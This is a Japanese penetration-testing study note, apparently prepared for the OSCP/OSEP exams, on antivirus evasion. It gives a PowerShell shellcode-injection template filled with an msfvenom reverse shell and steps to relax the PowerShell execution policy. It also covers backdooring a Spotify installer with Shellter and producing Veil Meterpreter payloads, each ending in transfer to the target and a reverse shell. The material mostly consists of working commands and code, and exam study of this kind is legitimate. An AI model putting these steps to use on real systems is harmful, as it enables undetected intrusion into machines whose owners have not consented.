補足
- 公式には言及されていないが、AV Evasionは原則OSCP試験の範囲外である
	- OSEPではガッツリ範囲


---

- [ ] 以下、OSEP受験時にまとめる
- 関連ノート：
	- [[4. Introduction to Antivirus]]
	- [[5. AV Evasion：Shellcode]]

---

# In-Memory Evasion（メモリ回避）

メモリ回避とは、ファイルをディスクに書き込まず、すべての処理を揮発性メモリ（RAM）内で完結させることで、ウイルス対策製品の検出を避ける手法。
([[5. AV Evasion：Shellcode]]で解説しているPackerなどはOn-Disk Evasionで、ディスク上の活動を検知されないようにするもの)

## 特徴

- ディスクにファイルを保存しない（＝AVが最も注目する領域を回避）
	- 最近のEvasionテクニックはこちらが主流
- OS標準のWindows APIを利用
- バイナリの難読化やセクション改変が不要
- 攻撃者は主にC/C++やPowerShellを使って実装

---

## 主な手法と概要

| 技術                       | 説明                                                                                                              |
| ------------------------ | --------------------------------------------------------------------------------------------------------------- |
| Remote Process Injection | 対象プロセスに対して `OpenProcess` → `VirtualAllocEx` → `WriteProcessMemory` → `CreateRemoteThread` の流れでペイロードを挿入し、メモリ上で実行 |
| Reflective DLL Injection | `LoadLibrary` を使わず、独自コードでDLLをメモリ上に読み込む（DLLをファイルとして書き出さない）                                                       |
| Process Hollowing        | 無害なプロセスを一時停止状態で起動 → メモリ上の実行イメージを削除 → 悪意あるコードを上書き → プロセス再開で悪意コードが実行される                                           |
| Inline Hooking           | 正規の関数にジャンプ命令を挿入し、任意の悪意コードへリダイレクト。その後元関数に戻るため、正規コードに見せかけた実行が可能                                                   |

### Inline Hookingの応用：Rootkits

- Hooking技術を使って、システムコールやカーネル関数を改ざん
- 権限昇格（Privilege Escalation）後にインストールされるケースが多い
- ユーザーモード、カーネルモード、ブートローダーやハイパーバイザー領域までフック可能


---

## On-Disk Evasionとの違い

| 比較項目     | On-Disk Evasion                                   | In-Memory Evasion            |
| -------- | ------------------------------------------------- | ---------------------------- |
| ファイルの扱い  | ファイルを難読化・暗号化して**ディスク上に保存**                        | ファイルを一切書き込まず、**メモリ上で展開・実行**  |
| 主な検出回避手段 | パッカー、エンコーダ、スタブ、署名改変など：[[5. AV Evasion：Shellcode]] | メモリ空間の操作やプロセス注入              |
| 対策されやすさ  | 静的検知（シグネチャ）やヒューリスティックで検出されやすい                     | メモリスキャンが必要なため検出が困難           |
| AVの防御対象  | ファイルシステム（on-access scan）                          | 実行中のプロセスやメモリ空間（runtime scan） |

### 補足

- PowerShellを使ったIn-Memory Injection は、より実装が簡単でAVバイパスに有効。内部でWindows APIをラップしている。
- 上記の多くはファイルレス攻撃（Fileless Attack）とも呼ばれる。

---
---

# Testing for AV Evasion

SecOpsは、企業のIT部門とSOCとの協力体制を指す。SecOpsの目的は、新旧問わずあらゆる脅威に対して継続的な防御と検知を提供すること。

ペネトレーションテスターとしては、SecOpsが直面している現実的なAV対応の視点を理解しておく必要がある。

---

## 攻撃側から見たVirusTotalの危険性

- VirusTotalは、アップロードされたファイルを複数のAVエンジンにかけて判定を行う。
- スキャン後、登録された全AVベンダーにサンプルが共有される。
- 共有されたサンプルは、各社のサンドボックスや機械学習エンジンにかけられ、新たな検出シグネチャが生成される可能性がある。
- 結果として、せっかく作ったペイロードやツールが**即日検出対象**になる危険がある。

---

## Kleenscanの活用

- [Kleenscan.com](https://kleenscan.com/)はVirusTotalの代替として使える。
- 約30種類のAVでスキャンし、第三者にはサンプルを共有しないと主張している。
- 無料で1日最大4回までスキャン可能（追加スキャンは有料）。
- ただし、Kleenscanもあくまで**最終手段**。ターゲットのAV情報が不明な場合に限定して使うべき。

---

## 理想的なAV回避テスト環境

- ターゲットのAVベンダーが分かっている場合は、それに合わせた**仮想環境（VM）を構築**し、実際の環境に近い設定でテストすべき。
- どのAVを使う場合でも、「サンプル自動送信」の設定は必ず無効にしておく。
    - 例：Windows Defenderの場合
        - 「Windows セキュリティ」 → 「ウイルスと脅威の防止」 → 「設定の管理」から無効化できる。
![[Pasted image 20250702073235.png]]
$$WindowsDefenderのサンプル自動提供の無効化$$

### サンプル送信とインターネット接続の関係

- Windows Defenderのクラウド保護やサンプル自動送信は、インターネット接続が前提。
- 実際のターゲット環境でクラウド保護が有効かどうかは、インフラポリシー次第。
	- [[4. Introduction to Antivirus#Detection techniques]]
- 一部の本番サーバでは外部接続が制限されており、ML検知など、高度なAV機能が使われていない場合もある。

---

## AV回避開発の基本指針

- 既知のツールや公開されたコードは避ける。
- **独自コードを優先**すること。
    - AVのシグネチャは過去のサンプルから生成されているため、コードが新規で多様であるほど、検出されにくくなる。
- すべてのAVをバイパスする方法を探すことは現実的ではなく、ターゲットで使われている特定のAV製品をバイパスする方法を考えるべき

---

# 実例：Aviraを対象にしたAV回避

## テスト用PEファイルで検出確認

まずはじめに、AVがきちんと動作するかをテストすべき

- 事前にmsfvenomで生成した適当なペイロードをWindowsクライアントに転送。
- 転送後、即座にAviraが警告を表示し、ファイルはブロック・隔離される。

補足：AVの検疫機能は、カーネルレベルでのファイル操作ブロックや、AV専用の暗号化ストレージへの移動によって実装されている。

---

## 💥PowerShellによるリモートプロセスインジェクション

- ターゲット環境がそれほど厳しくなければ、PowerShell経由での回避が可能なケースがある。
- この例では、PowerShellインタプリタ自身（x86版）への*リモートプロセスインジェクション*を行う。

### PowerShellの強みとAV回避への応用

- PowerShellはWindows APIと連携可能な強力な機能を持つ。
- これにより、インメモリインジェクション処理を**PowerShellスクリプト内で**実現可能。
- 実行形式ファイル（PE）ではなくスクリプトなので、検知されにくい。
    - AVソフトは、変数名、コメント、ロジックを確認することが多い
    - PEは都度コンパイルが必要だが、スクリプトはコンパイルなしに変更が可能であるためテストが楽

### 1. リモートプロセスインジェクションのテンプレートスクリプト

次のPowerShellコードは、Windows API を使って「メモリ上にペイロードを配置し、powershell.exe プロセス内で実行する」*リモートプロセスインジェクション*の基本テンプレート：
```powershell
$code = '
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

[DllImport("msvcrt.dll")]
public static extern IntPtr memset(IntPtr dest, uint src, uint count);';

<place shellcode here>
```

|API名|説明|
|---|---|
|`VirtualAlloc`|メモリ領域を予約・確保（EXECUTE_READWRITE 権限で確保）|
|`memset`|確保したメモリ領域を初期化|
|`CreateThread`|指定したアドレス（シェルコード）で新しいスレッドを作成・実行|

この時点ではシェルコードは挿入されていないので、
`<place shellcode here>` にペイロードを挿入する必要がある。

---

### 2. シェルコード生成

`msfvenom` を使って PowerShell 互換の形式でペイロードを生成：
```zsh
msfvenom -p windows/shell_reverse_tcp LHOST=[AttackerIP] LPORT=[Port] -f psh-reflection
```
- `-f psh-reflection`: PowerShellリフレクション形式で出力
- 出力結果：Base64エンコードされたシェルコードを含む関数とロジック（関数名や変数名は毎回ランダム）

---

### 3.最終構成コード

1. [[#1. リモートプロセスインジェクションのテンプレートスクリプト]]の`<place shellcode here>`に[[#2. シェルコード生成]]で生成したシェルコードを注入する。
```powershell
$code = '
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

[DllImport("msvcrt.dll")]
public static extern IntPtr memset(IntPtr dest, uint src, uint count);';

function xf {
        Param ($nfCl, $vf)
        $uaQP = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')

        return $uaQP.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String])).Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($uaQP.GetMethod('GetModuleHandle')).Invoke($null, @($nfCl)))), $vf))
}

function xb {
        Param (
                [Parameter(Position = 0, Mandatory = $True)] [Type[]] $jGN_b,
                [Parameter(Position = 1)] [Type] $hh = [Void]
        )
...
```

2. 上記のスクリプトをKali上で保存してターゲット環境に渡すか、ターゲット環境でメモ帳を起動し貼り付け、拡張子を`ps1`として保存する

#### 重要なポイント

- `psh-reflection`形式は、関数名や変数名をランダムに生成するため、AVのシグネチャ検出を回避しやすい。
- スクリプトはただのテキスト。バイナリのように明確な構造がないため、静的解析では識別が困難。
- AV製品はスクリプト内容（関数名・変数名・論理構造）をもとに検出するが、それらを変化させることで検出回避が可能。
- シェルコードが直接PEとしてディスクに書かれないため、on-diskシグネチャ検出も回避可能。

---

### 4. 検知確認・実行(ポリシー変更)

#### 検知されないことを確認

- ターゲット環境のAVソフトで検知があがらないことを確認するため、[[#理想的なAV回避テスト環境]]もしくは[[#Kleenscanの活用]]をし、検知されないことを確認する
- 以下はVirusTotalの画面だが、今回のテストで使用しているAviraは検知ベンダーに記載なし
![[Pasted image 20250702122439.png]]
$$VirusTotalでAviraは検知していない$$

補足：検知された場合
	AVソフトは、変数名、コメント、ロジックを確認することが多いことから、変数や関数名を変更すると検知を回避できることがある。

#### 実行

1. PowerShellを起動
	 （今回はmsfvenomで作成したペイロードがx86版なので、x86版PowerShell起動）
2. 実行
```powershell
.\bypass.ps1
```
	↓
```
.\bypass.ps1 : File C:\Users\offsec\Desktop\bypass.ps1 cannot be loaded because running scripts is disabled on this
system. For more information, see about_Execution_Policies at https:/go.microsoft.com/fwlink/?LinkID=135170.
At line:1 char:1
+ .\bypass.ps1
+ ~~~~~~~~~~~~
    + CategoryInfo          : SecurityError: (:) [], PSSecurityException
    + FullyQualifiedErrorId : UnauthorizedAccess
```
→ <u>実行ポリシー（Execution Policy）により実行ができない</u>

3. エラーメッセージの中のリンク（`https:/go.microsoft.com/fwlink/?LinkID=135170`）にアクセスし、実行ポリシーの適用範囲を決定する
	- ユーザー単位
	- システム単位

- 実行ポリシーについての補足：
	- 1つまたは複数のActive Directory GPOによって指定されている可能性がある
	- その場合は以下の回避策は使えないので、別のバイパス・ベクトルを探す

4. ここではユーザー単位の実行ポリシーを変更するため、まずポリシーを確認
```powershell
Get-ExecutionPolicy -Scope CurrentUser
```
	↓
```
Undefined
```

5. ポリシーを変更し、変更結果を確認
```powershell
Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser
```
	↓
```powershell
Execution Policy Change
The execution policy helps protect you from scripts that you do not trust. Changing the execution policy might expose
you to the security risks described in the about_Execution_Policies help Module at
https:/go.microsoft.com/fwlink/?LinkID=135170. Do you want to change the execution policy?
[Y] Yes  [A] Yes to All  [N] No  [L] No to All  [S] Suspend  [?] Help (default is "N"): 
```
	↓Yes to ALL
```powershell
A
```

```powershell
Get-ExecutionPolicy -Scope CurrentUser
```
	↓
```
Unrestricted
```

6. 攻撃者側でリスナーを立てる
```zsh
sudo rlwrap nc -lvnp 4444
```
6. もう一度実行し、実行が成功することを確認
```powershell
.\bypass.ps1
```

##### 補足：PowerShellワンライナー

- [[What is the shell#Base64化したPowerShellリバースシェルワンライナー]]
- この方法では、psファイルを保存する必要もないので、ファイルベースのスキャンに引っ掛かりにくいなどのメリットがある
	- 一方で、psファイルは複数回実行が必要なスクリプトなどに向いている。

##### 🚨.ps1ファイルの欠点

- ps1ファイルをターゲットユーザーにダブルクリックさせても、スクリプトがメモ帳で開かれるだけで実行はされない
- 上述のように、PowerShellを開かせ、`\bypass.ps1`とさせる必要がある
- 通常、ターゲットユーザーにpsスクリプトをPowerShellで実行させることは難しい
	- → [[#Veil-frameworkを使ったAV evasion]]

---
---

# AV Evasionの自動化

## Shellterによるシェルコードインジェクション

無料のAV回避ツールである[*Shellter*](https://www.shellterproject.com/)を使う

### Shellterとは

- Shellterは動的シェルコードインジェクションツールであり、フリーで利用できる中でも特に有名なAV回避ツールのひとつ。 
	- ※Windows用
- 信頼された実行ファイルに悪意のあるシェルコードを埋め込むことが可能
	- 実行直前にペイロードとペイロードデコーダの両方を難読化するのでシグネチャベースの静的検知を容易にバイパス
- 検知されやすい代表的な手法（セクション権限の変更、新しいセクションの作成など）を避けているのが特徴。
- また、既存のImport Address Table（IAT）を利用して、メモリの確保、コードの転送・実行を行う関数を特定し、そこからペイロードを動作させる。
- 有料版のShellter Proも存在しており、32bitおよび64bitバイナリをサポートし、よりステルス性の高いAV回避機能が含まれている。
	- ※無償版は32bitのみ

### Shellterのインストール

1. インストール
```zsh
sudo apt install shellter
```

2. wineのインストール：参照→[[Module 14：Fixing Exploits#クロスコンパイル環境の準備・実行]]
	- Shelterがwindows用アプリケーションなため

3. インストールの確認
```zsh
shellter
```
	↓

![[Pasted image 20250704072258.png]]
$$Shellter起動画面$$

#### Shellterのモードについて

- `A/M/H`がある
- A：Auto mode
- M：Manual mode
	- インジェクションに使用したいPEを起動し、より詳細なレベルで操作できる
- Manual modeは、<u>Auto modeで失敗したときに</u>使う。

---

### 実例：Spotifyインストーラのバックドア化

- ※ 実際のテスト現場では、新しく、あまり精査されていないアプリケーションを選ぶこと
	- [An important tip for Shellter usage - official doc](https://www.shellterproject.com/an-important-tip-for-shellter-usage/)

1. Shellterの起動→Shellterのプロンプトに「A」と入力してAutoモードを選択
```zsh
shellter
Choose Operation Mode - Auto/Manual (A/M/H):    A
```

2. ターゲットPEファイルを選択し、パスを入力
	- 今回はSpotifyインストーラー（EXE）を選択
	- ShellterはPEファイルに対し、変更を加える前に自動でバックアップを作成する
	- ⚠️少し待つ
![[Pasted image 20250704122954.png]]
$$ターゲットPEの選択・自動バックアップ$$

3. ステルスモードを有効に選択（Y）
	- ペイロードを実行した後、通常のPEとして振る舞うようにする
![[Pasted image 20250704124053.png]]
$$StealthModeの選択と有効なペイロード一覧$$

4. 使用するペイロードを選択する
	- L：リストにあるペイロードを使う
	- C：自作のペイロードを使う
	- ここでは1番を選択する。msfvenomのように、LHOST、LPORTの入力が求められる。
![[Pasted image 20250704124409.png]]
$$ペイロードの選択$$

5. Verification（有効かどうかを検証）する
	- Info、Warningを読む
	- Enterを押すとターゲットPEファイルが悪意あるPEファイルに変換される
![[Pasted image 20250704124644.png]]
$$Verification Stage$$

6. ターゲットに送る前に攻撃者のマシン上でmeterpreterリスナーを立てる
```zsh
msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST [AttackerIP];set LPORT [Port];run;"
```

7. [[ファイル操作、ユーティリティ#ファイルの転送]]でターゲットのWindowsマシンに転送
8. ターゲット上のAVでスキャンをし、悪意あるPEファイルが検知されないことを確認できたら、PEファイルを実行→シェル獲得

---

## Veil-frameworkを使ったAV evasion

- [Veil-framwork - GitHub](https://github.com/Veil-Framework/Veil)は、一般的なAVをバイパスするmetasploitペイロードを生成するために設計されたツール
	- ==msfvenomのエンコードだけではバイパスは難しい==
- [[#🚨.ps1ファイルの欠点]]のように、ユーザーにPowerShellを開かせてps1ファイルを実行させる必要がないことがメリット。

1. インストール
```zsh
sudo apt install veil
```
 veilの起動
```zsh
sudo veil
```
↓初回起動時はveilのインストールの続きを実施（Sでいい）
```zsh
[?] Are you sure you wish to install Veil?
     Continue with installation? ([y]es/[s]ilent/[N]o): 
```

2. Veil-Evasionモードの選択
	- Ordance：ペイロードに使用できるシェルコードを生成する（古い、Evasionに統合済）
```zsh
use 1
```
![[Pasted image 20250705204358.png]]
$$Veilの起動・Evasionの選択$$

3. PowerShellのbatファイル生成ペイロードを選択
```zsh
list
```
	↓
```
[*] Available Payloads:                                                  1)      autoit/shellcode_inject/flat.py
	2)      auxiliary/coldwar_wrapper.py
	3)      auxiliary/macro_converter.py
	4)      auxiliary/pyinstaller_wrapper.py
...
```
	↓
```zsh
use 22
```

4. オプションの入力
```zsh
options
set LHOST [AttackerIP]
```

5. ペイロードの生成
```zsh
generate
```
	↓
```
 [*] Language: powershell
 [*] Payload Module: powershell/meterpreter/rev_tcp
 [*] PowerShell doesn't compile, so you just get text :)
 [*] Source code written to: /var/lib/veil/output/source/payload.bat
 [*] Metasploit Resource file written to: /var/lib/veil/output/handlers/payload.rc
```

6. ターゲットに送る前に攻撃者のマシン上でmeterpreterリスナーを立てる
```zsh
msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST [AttackerIP];set LPORT [Port];run;"
```

7. [[ファイル操作、ユーティリティ#ファイルの転送]]でターゲットのWindowsマシンに転送
8. ターゲット上のAVでスキャンをし、悪意あるPEファイルが検知されないことを確認できたら、PEファイルを実行→シェル獲得